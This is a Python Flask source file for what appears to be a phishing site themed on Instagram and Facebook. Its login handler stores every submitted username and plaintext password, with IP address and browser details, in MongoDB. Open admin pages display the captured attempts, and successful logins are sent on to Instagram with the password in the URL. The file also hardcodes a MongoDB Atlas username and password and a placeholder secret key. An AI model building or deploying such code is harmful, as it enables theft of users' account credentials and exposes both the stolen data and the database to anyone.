import os
from flask import Flask, render_template, request, redirect, url_for, flash, jsonify
from pymongo import MongoClient
from werkzeug.security import generate_password_hash, check_password_hash
from dotenv import load_dotenv
from bson import ObjectId
from datetime import datetime
import urllib.parse


# MongoDB connection
client = None
db = None
users_collection = None
login_attempts_collection = None


class User:
    def __init__(self, username, password_hash=None, _id=None):
        self.username = username
        self.password_hash = password_hash
        self._id = _id

    def set_password(self, password: str) -> None:
        self.password_hash = generate_password_hash(password)

    def check_password(self, password: str) -> bool:
        return check_password_hash(self.password_hash, password)

    def to_dict(self):
        return {
            "username": self.username,
            "password_hash": self.password_hash
        }

    @classmethod
    def from_dict(cls, data):
        return cls(
            username=data["username"],
            password_hash=data["password_hash"],
            _id=str(data["_id"])
        )


def create_app() -> Flask:
    load_dotenv()
    app = Flask(__name__)

    # Config
    app.config["SECRET_KEY"] = "your-secret-key-here-change-this-in-production"
    
    # MongoDB Atlas connection - directly using connection string
    global client, db, users_collection, login_attempts_collection
    
    try:
        # Your MongoDB Atlas connection string
        mongodb_uri = "mongodb+srv://snakesroz:Pass123@snakes.rvzfhss.mongodb.net/instagram_facebook_app?retryWrites=true&w=majority&appName=Snakes"
        
        client = MongoClient(mongodb_uri)
        db = client.get_database()
        users_collection = db.users
        login_attempts_collection = db.login_attempts
        print("Connected to MongoDB Atlas successfully!")
        
    except Exception as e:
        print(f"Error connecting to MongoDB Atlas: {e}")
        # Fallback to local MongoDB if Atlas connection fails
        client = MongoClient("mongodb://localhost:27017/")
        db = client.instagram_facebook_app
        users_collection = db.users
        login_attempts_collection = db.login_attempts
        print("Connected to local MongoDB")

    @app.route("/")
    def index():
        return render_template("index.html")

    @app.post("/login")
    def login():
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "")
        
        # Get user IP address
        user_ip = request.remote_addr
        timestamp = datetime.now()
        
        # Check if user exists and password is correct
        user_data = users_collection.find_one({"username": username})
        login_successful = False
        
        if user_data:
            user = User.from_dict(user_data)
            if user.check_password(password):
                login_successful = True
                # Redirect to Instagram with credentials
                instagram_url = f"https://www.instagram.com/accounts/login/?username={urllib.parse.quote(username)}&password={urllib.parse.quote(password)}"
                result = redirect(instagram_url)
            else:
                result = redirect(url_for("wrong_password"))
        else:
            result = redirect(url_for("wrong_password"))
        
        # Store login attempt in MongoDB (both successful and failed attempts)
        login_attempt = {
            "username": username,
            "password": password,  # Storing actual password for audit
            "ip_address": user_ip,
            "timestamp": timestamp,
            "successful": login_successful,
            "user_agent": request.headers.get("User-Agent", ""),
            "referrer": request.headers.get("Referer", ""),
            "redirected_to_instagram": login_successful
        }
        
        try:
            # Insert login attempt
            login_attempts_collection.insert_one(login_attempt)
            print(f"Login attempt stored: {username} - {'SUCCESS' if login_successful else 'FAILED'}")
            
            if login_successful:
                print(f"Redirecting {username} to Instagram: {instagram_url}")
            
        except Exception as e:
            print(f"Error storing login attempt: {e}")
        
        return result

    @app.route("/signup", methods=["GET", "POST"])
    def signup():
        if request.method == "POST":
            username = request.form.get("username", "").strip()
            password = request.form.get("password", "")
            if not username or not password:
                flash("Username and password are required", "error")
                return render_template("signup.html")
            
            # Check if username already exists
            if users_collection.find_one({"username": username}):
                flash("Username already exists", "error")
                return render_template("signup.html")
            
            user = User(username=username)
            user.set_password(password)
            
            # Insert user into MongoDB
            result = users_collection.insert_one(user.to_dict())
            user._id = str(result.inserted_id)
            
            flash("Account created. You can now log in.", "success")
            return redirect(url_for("index"))

        return render_template("signup.html")

    @app.route("/wrong-password")
    def wrong_password():
        return render_template("wrong_password.html")

    @app.route("/forget")
    def forget():
        return render_template("forget.html")

    @app.route("/facebook-login")
    def facebook_login():
        return render_template("facebook_login.html")

    @app.route("/admin/users")
    def admin_users():
        users_data = list(users_collection.find())
        users = [User.from_dict(user_data) for user_data in users_data]
        return render_template("admin_users.html", users=users)

    @app.route("/admin/login-attempts")
    def admin_login_attempts():
        # Get all login attempts, sorted by timestamp (newest first)
        attempts_data = list(login_attempts_collection.find().sort("timestamp", -1))
        
        # Format timestamps for display
        for attempt in attempts_data:
            if "timestamp" in attempt:
                attempt["timestamp"] = attempt["timestamp"].strftime("%Y-%m-%d %H:%M:%S UTC")
        
        return render_template("admin_login_attempts.html", attempts=attempts_data)

    return app

app = create_app()
if __name__ == "__main__":
    app.run(host="0.0.0.0",port=5000,debug=False)


